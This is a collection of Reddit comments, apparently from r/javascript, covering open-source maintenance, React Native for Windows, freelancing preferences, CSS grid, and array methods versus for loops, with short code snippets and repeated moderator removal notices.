I wouldn't be so harsh for maintainers. Axios is one of the most popular packages in the whole js ecosystem, it's like a default lib for requests no matter if you're a completely beginner or mid-level dev, working with node or react. Because of that main axios contributor post his *call for help* several times in many places like hackernews and even this sub. And there are still some many trivial to fix issues (even with PRs), but the overall count of them can cause a headache (just look on the numbers now - there are 501 issues and 115 pull requests). And even if you've got a bunch of helpers, maintaining this kind of project - which got no support from some big companies - is really hard. Blaming guys who gave their free-time for making your work-time more efficient is not the best way to say "thanks", don't forget they also have go to work, got families etc. And because of all that sometimes issues have to be exposed by big name from outside, which highlight emerging problems - like it happen in this case.
sl4a has been around, since way before any of this.
No ! I will check it out it looks good. Thanks mate
No! i will check it out. Thanks mate
Please do! Everyone benefits from that
Go to github.com and use search, selecting (on the left) `Issues`, and `JavaScript` for the language, then use terms like "easy" or "simple" in the search box. This should pick up on bugs people have logged against repos that would likely be easy to fix.
I‚Äôm not a full time freelancer, but if anyone asks for spec work or argues about timing of payment, it‚Äôs a total red flag. The actual cost can vary and is up for negotiation, but not the timing.
But NativeScript still doesn't have Windows support. But there is a community project going on in Github. Hopefully that becomes a thing.
&gt; Microsoft supporting it officially is a huge push for javascript as a means to drive native apps. I absolutely loathe and despise windows and everything microsoft. But if they push JS like this they could continue to dominate desktops for another decade. I wish the gnome foundation would get aligned around JS the same way. &gt; I think the implications are pretty clear by now, everything that can be javascript will be javascript in the coming years. Its clear to some of us, but tribalism is going to make some people late to the party.
Are you a student? And it could be meaningless but how old are you? I thought you are talented as hell. Nice work dude.
Hi /u/bubble_boi, this post was removed. Posts must directly relate to JavaScript. Content regarding CSS, HTML, general programming, etc. should be posted to their respective subreddits instead of here. Here's some related subs that might be useful: * /r/css * /r/php * /r/html and /r/html5 * /r/webdev * /r/frontend * /r/programming Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
I used to be more motivated to work on any simple - frontend only - website, when I was still begining my CS course. Nowadays I prefer developing management systems instead of simple websites. While I have experience with CSS, I've got tired of working with web design and found no one to help me on that (making a responsive website drives me crazy).
Nah, not gonna happen.
When I was a freelancer, the best ones were the quick ones. The less time there is to do something, the smaller the scope (making it easier to do) and the less time there is for people to bicker about the details. One of my favorite projects was a small game I knocked out for kellogs in a little under 24 hrs. I don't think I ever avoided anything. Some were worse than others, but at the time I wouldn't have any way of knowing it before going into it. And nothing was so bad, looking back, that even now I would have said no because I still needed the money ;)
Can you elaborate on ‚Äúemulate the browser inside the browser‚Äù?
üëã
Yes, you are right, I was being too harsh.
Hi /u/tjcoolsays, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/malieop, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/necronhyperion, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
no im terrible at css and designs...
Hi /u/scheduled_nightmare, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
...it's how capitalism works!
So am I! Have you checked out libraries for helping with that? I find that they also help you in learning how to be good at stuff like that. Bootstrap is the obvious first one. Good thing about libraries like Bootstrap is that they are easy enough to learn and do awesome things like make your website responsive without much input from you. They use media queries under the hood! For example when I viewed on mobile I had to scroll to the right of the map in order to find the stats and what not...I was super confused at first. But Bootstrap would allow that to scale nicely so it would put the stats under the map, which is more natural for mobile.
Hi /u/theoriginalchboi, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
You could look at the Ember.js community, there is a lot of repositories that are well documented, then you can look at issues marked as "Good for new contributors" those are well documented. https://github.com/ember-learn/emberjs-contributors-workshop I think it is a good place to start. If you encounter problems you could join Ember.js Discord channel and ask on #help.
I get you, I'm not at all experienced, just learning and even though bootstrap and flexbox are awesome, they confuse the s\*\*t out of me sometimes.
But you'd still need to check if `res` was truthy? Doesn't seem to be much difference
Frontend is confusing to me too. Even after learning CSS Grid, which was a relief, didn't make things better for me. It doesn't matter if you are a "fullstack", you'll always prefer back or front.
I will have to check out CSS grid, that's how much of a noob I am ;)
Yeah, I don't really understand what's with so much hate for a lot of the new libs/frameworks coming out? I went to a conference a few years back where someone had built an ML algorithm that would iterate over every single image on the web (art) and found that they have all been done before. There's nothing really entirely new every image could be tracked and find an almost identical image from years ago (a lot more to in-depth than that and was super interesting). But, It really upsets me this mentality of "oh but this is just this" and "why are we always reinventing the wheel". It's like saying, we can't ever do anything because it's already been done. Even if it's new, but the thought process/paradigm behind it is something widely used back in the 60s. We can't do it because we're just reinventing the wheel. React, Angular and Vue aren't the same. They handle and do stuff differently. It's different ideas and solutions to the same problem, that to me isn't reinventing the wheel.
Any job where the customer wants me to review their full time coder's work / talks smack about them. Almost guaranteed they'll argue about payment / time. Avoid like the plague. They tend to be 'rich kids first startup' types...who see payment as 'optional' and negotiable whilst taking no responsibility for speccing work appropriately (and don't see it as the contract for work it actually \*is\*).
It's awesome, keeps you HTML clean and your divs actually make sense when you use it. It's not hard, give it a try later! :D
Maybe. Depends on the exact use case. I was just pointing out it has similar functionality to OP‚Äôs Go-style code with fully native syntax.
Cool! thanks!!
Not played with grid myself yet, but looking forward to it after watching a video; [https://www.youtube.com/watch?v=7kVeCqQCxlk](https://www.youtube.com/watch?v=7kVeCqQCxlk)
Just be mindful of what browsers you are supporting. CSS grid is awesome but fairly new, it won't work on IE or older browsers.
Microsoft has actually built and supported RN for Windows for a couple of years now. It previously had UWP and WPF backends mostly written in C#. This is announcement is about the new C++ backend. It sounds great, and it's still exciting news, but it was in theory nice to be able to create RN wrappers around some very nice pre-existing WPF widget toolkits, both free and commercial. Regardless, it's nice to see MS give React Native even more attention.
Virtual scrolling, taking over the back button, loading spinners in plce of hourglass when an ajax forms are submitted.....there are probably more examples
Are there companies that forbid you from doing so?
Nope, it won't have any impact on Xamarin! Check out [this article from yesterday](https://devblogs.microsoft.com/dotnet/introducing-net-5/) on where the .NET ecosystem is heading. These are two different teams within MS, both with a mandate to make awesome OSS stuff.
Sure there are, depending on the circumstance. But I think you missed the point. Companies rely heavily on open source but rarely offer their employees time to contribute back.
Yeah that got me too, also the fact it‚Äôs responsiveness is non-existent!
learn CSS grids and then you will be able to make TheRightSudoku
hahahaha I see what you did there
Kind of in the same boat. It's weird seeing this unfold, years ago i had my career path set with c#, xaml and wpf - but it all went downhill. I saw them try gather dev support with uwp, no one i knew cared any longer. If they don't want their OS become a host for electron/chrome apps, going RN is probably the only choice left. On the other hand it will set a nice stage for javascript rendering native content.
Wdym same space? You also working on a bell scheduling app?
I‚Äôd rather not say, but yes I am a full time student
Greenfield projects only. No WordPress, No Shopify, No Wix, No Squarespace. No maintenance without a retainer. 10 hrs/month min retainer. $100/hr min. 50% to start work. 25% after first milestone. 3 max change orders and no new features after first milestone. Remainder due on completion. I don‚Äôt work without a signed contract.
That project is 3 years old and has been in the open source for quite a while. I'm wondering why they put out a press release over it just now?
Made pizza yesterday. Shiitake mushrooms, prosciutto and Gorgonzola. Having conducted tests, I can confirm, I have the perfect pizza topping.
Looks solidly ingrained within MS. Thanks for sharing the link.
I hate to develop web sites that I haven't designed myself. Or fix bugs on sites made by other developers.
If it wasn't a Google project I will say this is the framework to use. But alas I don't trust them to back their stuff as the abandoned a lot of things. Having said that they have supported Dart for a long time.
React is not hard. to pick up anyways. I come from Angular background and React wasn't a hard pickup framework to learn.
Chrome already has an extension called IE tab that does the same thing so I am not surprised MS did a similar thing.
It goes through each item in the group. If the map contains that item, it matches.
How does this differ from nuxt generate?
Flutter already has over 60k stars on GitHub. It has the needed momentum. Also looks to be native for Fuchsia. https://github.com/flutter/flutter flutter/flutter - GitHub
I've seen this kind of projects long time ago.. &gt;Microsoft open sourced React Native for Windows over 3 years ago. The new thing that's happening now is they‚Äôre basically rewriting it from scratch for better performance. But the idea (and the project) is definitely not new.
Static websites. I avoid the jobs in which the client is unsure what they need out of the product and often change their mind. Also if you ask for a web developer to work on your site please have access to all the resources affiliated with your site. May sound obvious but I've encountered that too many times already.
Bonus: It will also be faster than any of those frameworks which are trying to emulate what the browser now does natively. Web Components on your phone are way faster than React, Angular, or Vue.
Anything where the client has not completed design work. Vauge ideas about the look and feel of an application are a big no no.
Spec work is an automatic no reply. I don‚Äôt even bother responding after that point and ignore all future emails/phone calls. If you don‚Äôt have the cash, you can‚Äôt afford it. Don‚Äôt waste my time.
For anyone interested in implementing this (and not already invested in a different stack), Gatsby/`gatsby-image` comes with an easy-to-use [Traced SVG feature](https://using-gatsby-image.gatsbyjs.org/traced-svg/) inspired by this exact demo.
Right. Thanks for your response!
Robotlegs was the only DI container I ever enjoyed using. What a smart approach that was.
Wow! Thanks so much to all of you for the awesome replies so far! very enlightening!
If it prompts open-source maintainers to update their projects, then I'd class that as a win.
So it seems like the play for money is offering deployment services? Or maybe a platinum tier?
Ah, that's amazing :-)
first off, you don't need a library for that, just css [https://css-tricks.com/styling-based-on-scroll-position/](https://css-tricks.com/styling-based-on-scroll-position/) secondly, its a very bad design and should not be implemented.
I like working on greenfield projects and I use a philosophy very similar to /u/brodega's, and I also enjoy teaching very much. I avoid Magento as far as platforms go, and clients who want it all, right now and for the cheap.
nice
I like having full creative control when doing client work. I typically don‚Äôt take the work unless I get carte blanche.
Well yeah reduce is gonna be less readable when you write it like that lol. Just couple your data together then flat map it props.item.details.clients .map(client =&gt; client.errorConfigurations.map(config =&gt; [client, config])) .flat_map(([client, config]) =&gt; ({ errorMessage: config.error.message, errorLevel: config.error.level, usedIn: client.client.name })) And use reduce to implement flat\_map
Yeah, you definitely want to avoid infinite loops in javascript! But infinite loops are more forgiving in javascript than they are in unity and things. In things like unity your computer will freeze, but in javascript the tab will just not respond.
I'm confused: I like the idea of breaking it down like that, but why make a custom `flat_map` when there is https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/flatMap?
Great article. I mentor programming learners and one thing I tell them when they get to loops/array iteration methods is "look, you need to learn the for loop because A) you sometimes need to iterate through arbitrary numbers (see 'fizzbuzz') and B) code written by non-ES6-using coders will still use for loops, and you need to be able to understand their code." BUT, in practice, when writing your own code, you should almost never need to actually use for loops; you should almost always use array methods instead. This article did an excellent job of breaking down why.
You can add state for this button e.g showButton. When fetching date simply set state accordingly to data you get.
Easy answer: I don't use the standard library ever so I didn't know there was already a flatMap
There's nothing about infinite loops in the article.
async CanDelete(key) { return Storage.get(key).then(result =&gt; { if(result.foo !== 'bar'){ return false; else { return true; } } } And now you can await the value of the return. There is no way to return a value synchronously from an async function. It simply doesn't exist yet.
... but `.map` is the standard library?
CanDelete will need to be an async function or return a promise that will resolve with the boolean result. &amp;#x200B; Async: &amp;#x200B; `async CanDelete(key) {` `let result = await Storage.get(key);` `if (`[`result.foo`](https://result.foo) `!== 'bar') {` `return false;` `} else {` `return true;` `}` `}` Promise: `CanDelete(key) {` `let promise = new Promise((resolve, reject) =&gt; {` `let result = await Storage.get(key);` `if (`[`result.foo`](https://result.foo) `!== 'bar') {` `resolve(false);` `} else {` `resolve( true);` `}` `});` `return (promise);` `}` Either way, CanDelete will now need to be called asynchronously too since it'll return a promise either way: &amp;#x200B; `CanDelete(key).then(result =&gt; {` `if (result == true) {` `//true was returned from internal function` `} else {` `//true was returned from internal function` `}` `})` &amp;#x200B; if you're using CanDelete within another function and you don't / can't use `then..catch` handlers you can make it async like the first example above.
I used it in the example cuz I'm not gonna tell the poor dude to install Immutable JS for one small problem lol
It wasn't so much AS3 that got shut down as plugins in general, a push prompted by [Steve Jobs'](https://www.apple.com/hotnews/thoughts-on-flash/) misinformation / misdirection campaign and with which Adobe unfortunately acquiesced.
I have been doing webstuff for over 10 years. Like most, i started with websites. PHP and javascript. Then came jQuery and it was magic. As the years progressed, we got chrome. Chromes v8 seriously pushed javascript in performance up to par and past the usual suspects you did have on the server (php, python, perl). Now javascript was actually fast enough you could build real apps on the web. The browsers got new apis and got better by each iteration. New browsers today are all ‚Äùevergreen‚Äù so you dont haveto worry about versions. These apps coupled with a rest backend is still the defacto way to build apps. The difference is apps vs. websites. I would never use react for a ‚Äùwebsite‚Äù. Here i would probably choose some server side framework or library and have it render pure html. Then sprinkle some javascript here and there. Store the content in postgres and maybe cache with redis. I have not done websites in many years, but almost only apps on the frontend, and written multiple servers too. Still, i would not pick react (or angular o vue) for a content only website. Now to answear your question. The reason is mostly hype. React hype is going strong, and it is used were it really should not be used. Ive seen job applicants who sell themselfs as ‚Äùfull stack developer‚Äù and they have only ever used react. Its the same that happenend a while back when rails was all the rage. Always use the right tool for the right job.
I like this. Greenfield projects alone would cut most of the crap projects out there. One of the worst things I‚Äôm dealing with on my current project is a client who has such a huge feature-set they don‚Äôt even understand all the use-cases so things keep coming up that need changed. They call them ‚Äúbugs‚Äù but how could they be if we never built it that way to begin with? Awful.
I totally agree about smaller projects. I‚Äôm currently on a project that is 6 months in the making and the amount of features is staggering. There are so many things to work on it‚Äôs hard to keep it all straight in our heads and there‚Äôs no end in sight. The feature-set is so massive even the client cannot keep it all straight, which is a huge waste of our time and their money.
Why would ES6 be the cut-off for not using for loops?
Always happy to meet a fellow user of Robotlegs. Hit me up if you ever find something has fun. I'll do the same. When robotlegs 2 brought in covarient mediation where you could bind mediators to interfaces instead of view directly, then views only had to implement the interfaces of the data domain they needed access. I felt next level... Kept hoping for other stuff to come around, webAssembly as compile target for an actual language, I'd take c# I don't care! But heh. I do enjoy React, I do enjoy how strongly the community is thinking about code. But still liked my old solution better than the new one. Maybe I'm old, maybe I refuse changes. I should get into react hooks apparently, start to learn how it can abstract logic and make re-usable functions. I guess I was very object oriented and should start thinking more functionally.
I mean they actually called it ECMAScript 4 and tried to get it added as a superset of Javascript. More deets here: [https://medium.com/@Pier/ecmascript-4-was-too-ahead-of-its-time-799e59232db0](https://medium.com/@Pier/ecmascript-4-was-too-ahead-of-its-time-799e59232db0)
Ok, first things first. In React *you* don't conditionally render anything: React does, *in response to you changing props or state*. It's a fine point, but an important one if you want to do well with React. So in this case, if you want to re-render after a promise returns, you don't want to do `somePromise.then(callReRenderMethod)`; what you want to do is `somePromise.then(changeYourComponentsState)`. One solution to all this would be to use a library like Redux, but that's a bit more advanced so I mention it just in case you want to learn it in the future. With pure React, you simply need to tie what comes back from your AJAX call to your component's state, and the best/most modern way to do that is with state hooks: const YourButton = () =&gt; { const [isFoo, setIsFoo] = useState(); makeSomeAjaxCall() .then(result =&gt; setIsFoo(result.foo); return isFoo? &lt;button /&gt; : null; }; or, with async/await: const YourButton = async () =&gt; { const [isFoo, setIsFoo] = useState(); const result = await makeSomeAjaxCall(); setIsFoo(result.foo); return isFoo? &lt;button /&gt; : null; }; But what if you don't want to make your AJAX call every time you re-render? What if you have some parent control that should make that call at some other time? Well then you just have to make that call there, and pass `isFoo` in as a prop: const ButtonParent = () =&gt; { const [isFoo, setIsFoo] = useState(); makeSomeAjaxCall() .then(result =&gt; setIsFoo(result.foo); return &lt;div&gt;&lt;YourButton isFoo={isFoo} /&gt;&lt;/div&gt;; }; const YourButton = ({ isFoo }) =&gt; { return isFoo? &lt;button /&gt; : null; }; Hope that helps.
Or neither.
Lemme know how it goes - glad to be of help
Do the array methods contain a way to break the loop? Let's say I have 10,000 items and I need to search through them to find 1 specific item. For performance, would it be better to use a for loop in the scenario, because what if you found the item you were looking for after like 20 items? continuing to search the remaining 9,980 items is a waste right? Sorry If I'm sounding noob I just want to learn.
Why do you think that it is bad design?
There are still a big company, so its hard to say how long they will stick to the path. For now at least, MS is acting like the most clued in of all businesses in the space right now. (with one exception) &gt; a host for electron/chrome apps, going RN Honestly I dont see a big difference there. I suppose it comes down to whether you reach the OS via a DOM or via an API like Node.js offers. Personally, I like keeping the UI stuff DOMish, while using the node.js for the rest of the system calls makes more sense to me. There is always going to be a place for sandboxing potentially hostile applications in a DOM, such as browsing the web. But an installed application probably deserves something better, like what node offers, imo.
I met a guy one time what he did for a living, he said, "I'm a consultant." I said, "What does that actually mean?" He quickly walked away from me. My buddy who I was with at the time says, "Never ask a consultant what they actually do. Years ago I used to be a consultant for a large firm. One time the firm was trying to win a contract with a company which did large scale Herding. We went out to the Midwest to meet with one of the land owners, my boss at the time was pitching a counting system where we would setup hundreds of cameras, microphones, and motion detectors. The boss says to the land owner, *With this multi-million dollar cow monitoring system and our specialized cow counting software, we'll be able to track your cows 24/7. There will be no part of your property where a cow will be able to hide. The system can identify an injured cow vs a sleeping cow by sound and position. It'll be able to track mating and field births. It will be an amazing boon to your business!* The land owner says, *That's all great and everything, but this is a sheep ranch.* We lost that contract and I moved on." Of course he was pulling my leg, these days I just ask folks who say they're consultants, "What field are you in?"
There is a find method on arrays to handle this.
ah nice, that's what I was looking for
Oh you're totally right: they (or at least the core ones like `forEach`) were introduced in ES5.
from many many years of UX design and development. Navigation should not move, it makes it hard on the user. Look at it this way, of all of the websites you have visited, how many have navigation that moves around on the page like your comp does.
Heavy metal playlist, caffeine, and sleep deprivation.
Fix a bug.
For the (hopefully rare) times I need to iterate with side effects, I prefer `for...of` to `forEach`. It's a cleaner syntax, and I can do things like `return` out of it. And a traditional for-with-semicolons still sees use in the occasional toy problem where I literally just need to iterate over numbers. But otherwise, I basically never use loops anymore. Definitely preferable in my mind.
Someone already pointed you to find, but I'll just add that for most use cases, there is an array method specific to that use case. For example, another breaking use case is doing a boolean check to see if anything/everything in an array matches some condition. For that you have Array.prototype.some and Array.prototype.every. You may come up with a specific use case that is not covered by existing array methods, and could see actual performance gains (i.e. more than milliseconds) from writing the loop manually. But that is pretty rare in real world use.
I generally prefer to talk to paying customers directly. Any middleman will try to get something for nothing, and they tend to want to hide the fact that I don't work for the middleman. With a direct contact there's also much less risk of misunderstandings and wasted time. Profit is also higher. The main issue is to get enough business on my own. I also prefer jobs where customers have an understanding of planning and specification. Even so I tend to do all work with that.
Bummer. I expected this to be a ready to use library or whatever that does the SVG path creation for me (getting the image data is easy). The link is really just a proof of concept.
Hi /u/noob64, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
I‚Äôve had similar experiences but with older, management types. They feel deeply insecure about the fact they don‚Äôt understand technology or the development process are highly sensitive. They often think they‚Äôre being scammed because they‚Äôre paying a lot of money for something they don‚Äôt understand. So any perceived setback validates that preconception.
Add the smallest feature, then a slightly bigger one and keep going
A lot of that can be communication; people from more traditional organisations can find 'agile' jarring...they need a lot of hand-holding and reporting to placate them.
That really depends. Nothing beats having someone to just answer questions and just about hold your hand through it for a little while. Barring that, There's no secret sauce, if you want to just find out how it works, trace inputs to outputs. (in all cases you'll probably be doing this a lot early on, and should always go through it at least once for every pathway). Ive found it helpful to find old issues that have been resolved with code changes, and seeing how I could have arrived at the solution myself. It'll ultimately have to be a balance between just learning the system as is, and doing your best to add a feature.
Look further in the replies to the tweet, people made path creation tools, and someone else commented that Gatsby can now do it too
Also a fun side note: [There's No "else if" in JS](https://dev.to/genta/theres-no-else-if-in-js--24f9)
Because of the c++ part which wasn't a thing before
&gt; inspired by this exact demo Oh, the tweet is from 2017
`for ... of` is also useful for working with iterators
What is a Greenfield project??
Thanks, makes sense.
It's a project that didn't exist until you build it. Contrast it with contacts where you are fixing existing application bugs or adding features to applications that someone else created
Hi /u/TinyatKoji, this submission was removed because you used a URL shortener. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
~90% users will be able to use it. Just as a reference point https://caniuse.com/#feat=css-grid
I kind of like refactoring someone else's bad code, as long as I'm not trying to create new features at the same time. Unfortunately it rarely happens that way. Usually it's a matter of trying to make a lot of enhancements while debugging a bunch of bugs, all the while trying to understand the previous person's crappy design and trying to explain why it's taking a while to the client.
Try to have a developer who has the most experience with the code base walk you through the code. Don't be afraid to ask a lot of questions.
Cool post!!! You are totally right.
Find some tutorials on creating a converter in html and javascript and follow them. Then do something similar for your own thing. Here's one to get you started. https://www.w3schools.com/howto/howto_js_length_converter.asp
Reddit and Hacker News.
I'm a full-time solo frontender and I've never laid my hands on CSS grid :P Flex works so well for me. I'm gonna learn it some day but I just haven't gotten around to it.
What I like most about the some and every methods is that they return true/false themselves, so you can use them directly in an if-statement. No need for a "found" variable.
The thing I always do is go through and add comment documentation to the code. As I read through and trace the system flow I leave comments explaining what does what and why. This first gives me an understanding of the code at the lowest levels, and second makes the next developer's life easier.
But only because the iterator spec doesn't support collection type methods ( which you can write yourself relatively trivially with a wrapper class implementing yield, though you need to be careful around iterators whose internal logic never terminates ). There's a library called wu which allows you to wrap terminable iterators, and call forEach, map, reduce, etc on them
&gt;We need more projects like LLVM and we need some ppl doing it for the web Isn't this what WebAssembly is?
This looks great, thanks.
reddit - /javascript channel or something more? Hacker News - I did not hear about it, I will check thanks a lot!
My guess it just takes a median of brightness and converts everything below it to grey and above it to white.
90% of the general population, but maybe not their target population. As long as they understand their target it should be fine.
Title made me think OP was suggesting we stop iterating, period. Aka not use ANYTHING that iterates, like find, map, forEach, etc. I was like uhh... So... Don't handle more than one thing?
oh. thanks
Well defined projects. Explicit requirements defined ahead of time. Well defined "done" status. Any request that is vague, not well defined, few requirements, etc... will not go well.
Hi /u/kalimerau, this post was removed. Posts must directly relate to JavaScript. Content regarding CSS, HTML, general programming, etc. should be posted to their respective subreddits instead of here. Here's some related subs that might be useful: * /r/css * /r/php * /r/html and /r/html5 * /r/webdev * /r/frontend * /r/programming Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/Qwertfart, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/worldalivetours, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/nindustries, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/motweb, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/artyonwheels, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Honestly? Ones where I can come into the office late, work from home, and be relied upon to deliver quality work before my deadlines, without micromanagement. I'm very flexible on just about every other aspect of my work, and have only had problems in over-formal environments where they worry too much about stuff unrelated to the task at hand. Ironically (or not), those settings produce some of the worst work I've seen.
I typed in "florida" and I got a "**677.15** % chance of survival" Curious what your doing for that calculation
This is where i am right now... its hell.
There are also some uses for for.. of loops, which are not to be confused with for.. in loops. Generally for performance sake if you need to process huge volumes of data. However, I rarely encounter those situations.
Honestly? I just hate the jsx: I have already written html and JavaScript in the days of jQuery and we all came to the conclusion that it was shit... But now? Trendy! And that's all I have against it. Welp, suck it up and learn it. Don't complain.
I also like to use `for` loops inside of `async` functions if I can't use `map` for some reason (IE I need the array values to be called sequentially, or I can't use `filter` and so I have to push values to an intermediary array in-place).
I like it, but I don't think having massive SVG tags in HTML is the proper way to populate those fields.
Project Page (?): https://github.com/ember-animation/ember-animated *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Any articles which starts with a question can be reasonably answered with "NO" without investigating any further.
Yes gatsby-image can easily produce various styles of lazy load previews here's the examples page https://using-gatsby-image.gatsbyjs.org/traced-svg/
Great point. It's funny how the language is so "two steps forward one step back"; `async`/`await` is definitely an improvement, but being forced to use `for` loops instead of array methods is clearly a step backwards.
&gt;However, I rarely encounter those situations. I think this is the key part. To quote the great programming god Donald Knuth: &gt;premature optimization is the root of all evil
Personally I've never found a good use case for iterators (outside of them being used as an implementation detail in libraries I use, they've always feel like pointless added complexity without benefit to me) ... but I'll take your word for it!
Is this essentially a Gatsby for Vue?
Honestly I feel the same way, I‚Äôm usually forced to deal with them in existing APIs like URLSearchParams and request headers
Cool article, but I think you missed out the biggest weapon in the fight against IF statements, polymorphism! [https://refactoring.guru/replace-conditional-with-polymorphism](https://refactoring.guru/replace-conditional-with-polymorphism)
Array.prototype.find will stop as soon as the first item is found. Similarly .findIndex .some and .every
I feel like the only one who still really likes for loops. My brain can read the syntax instantly. I like having an index. I like how you can nest loops with multiple indices. I like having the array[i] statement for inspection in the debugger. I like the ease of termination. I like how you can do so much with the condition. I like how it is one universal syntax. I like how it is usually fastest. It is also the most utilitarian, when you realize later you need to do extra logic in the loop. Stop acting like for loops are a syntactical blunder.
React and jsx has little to nothing in common with html+jquery. Honesty, if you organize it properly, it's super neat. Everything it's a component with a fairly simple purpose. And code is not that embedded in html as one might think. It's basically just event calls (onClick, onKeyPress, etc).
Full responsibility software-based product development and middle management. I usually work alone on projects, typically with customers that can't lead or specify them, so I do it all. I also have software products that I sometimes use as a base, to save time and effort.
That's pretty fantastic! I was kind of joking around with you, but real nice to read that kind of response. Thanks!
They are hit or miss for me. Sometimes they can be good if you have a lot of flexibility with how to implement new features, or refactoring code in old ones. I was actually hired for one without having used the stack prior to that. It was actually more painless than I thought.
I like those. I had worked on a Unity game (without prior knowledge of Unity!) for a minor but wanted feature that the studio owner wanted. Think of it like a small itch in the back that won't go away. It took me a week to add the thing he wanted and he was left to work on more important stuff so the problem won't distract him anymore.
If you use React [https://github.com/yosbelms/react-progressive-loader](https://github.com/yosbelms/react-progressive-loader) I opened an issue to support SVG after this thread [https://github.com/yosbelms/react-progressive-loader/issues/6](https://github.com/yosbelms/react-progressive-loader/issues/6)
So you pollute the codebase with basic comments?
